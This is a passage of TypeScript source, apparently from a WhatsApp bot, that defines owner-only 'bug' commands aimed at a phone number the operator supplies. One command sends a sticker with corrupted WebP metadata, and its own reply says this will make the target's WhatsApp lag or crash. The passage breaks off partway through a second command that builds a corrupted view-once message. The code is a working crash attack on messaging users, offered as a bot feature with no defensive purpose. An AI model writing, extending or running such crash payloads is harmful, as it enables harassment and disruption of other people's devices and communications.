   200→   200→
   201→   201→    // =========================================================================
   202→   202→    // BUG 4 - Sticker Bug (corrupted webp metadata)
   203→   203→    // =========================================================================
   204→   204→    {
   205→   205→      name: 'bug4',
   206→   206→      description: 'Sticker bug - sends a sticker with corrupted metadata causing lag/crash',
   207→   207→      category: 'bug',
   208→   208→      aliases: ['stickerbug', 'crash4'],
   209→   209→      cooldown: 15,
   210→   210→      isPremiumOnly: false,
   211→   211→      handler: async (ctx: CommandContext) => {
   212→   212→        if (!ctx.isOwner) {
   213→   213→          await ctx.reply('⛔ Owner only command.');
   214→   214→          return;
   215→   215→        }
   216→   216→        await ctx.react('☠️');
   217→   217→        const targetJid = getTargetJid(ctx.args);
   218→   218→        if (!targetJid) {
   219→   219→          await ctx.reply('❌ Usage: !bug4 <number>\nExample: !bug4 254104906247');
   220→   220→          return;
   221→   221→        }
   222→   222→        try {
   223→   223→          const stickerPayload = Buffer.from('RIFF\x00\x00\x00\x00WEBPVP8 \x00\x00\x00\x00', 'binary');
   224→   224→          await ctx.sock.sendMessage(targetJid, { sticker: stickerPayload });
   225→   225→          await ctx.reply(`☠️ *BUG 4 - Sticker* sent to ${ctx.args[0]}\n💬 Corrupted sticker payload sent - target WhatsApp will lag/crash.`);
   226→   226→        } catch (error: any) {
   227→   227→          await ctx.reply(`❌ Bug4 failed: ${error?.message || 'Unknown error'}`);
   228→   228→        }
   229→   229→      },
   230→   230→    },
   231→   231→
   232→   232→    // =========================================================================
   233→   233→    // BUG 5 - ViewOnce Bug (oversized caption on view-once)
   234→   234→    // =========================================================================
   235→   235→    {
   236→   236→      name: 'bug5',
   237→   237→      description: 'ViewOnce bug - sends a view-once message with corrupted data',
   238→   238→      category: 'bug',
   239→   239→      aliases: ['viewoncebug', 'crash5'],
   240→   240→      cooldown: 15,
   241→   241→      isPremiumOnly: false,
   242→   242→      handler: async (ctx: CommandContext) => {
   243→   243→        if (!ctx.isOwner) {
   244→   244→          await ctx.reply('⛔ Owner only command.');
   245→   245→          return;
   246→   246→        }
   247→   247→        await ctx.react('☠️');
   248→   248→        const targetJid = getTargetJid(ctx.args);
   249→   249→        if (!targetJid) {
   250→   250→          await ctx.reply('❌ Usage: !bug5 <number>\nExample: !bug5 254104906247');
   251→   251→          return;
   252→   252→        }
   253→   253→        try {
   254→   254→          const imgBuffer = Buffer.alloc(1024);
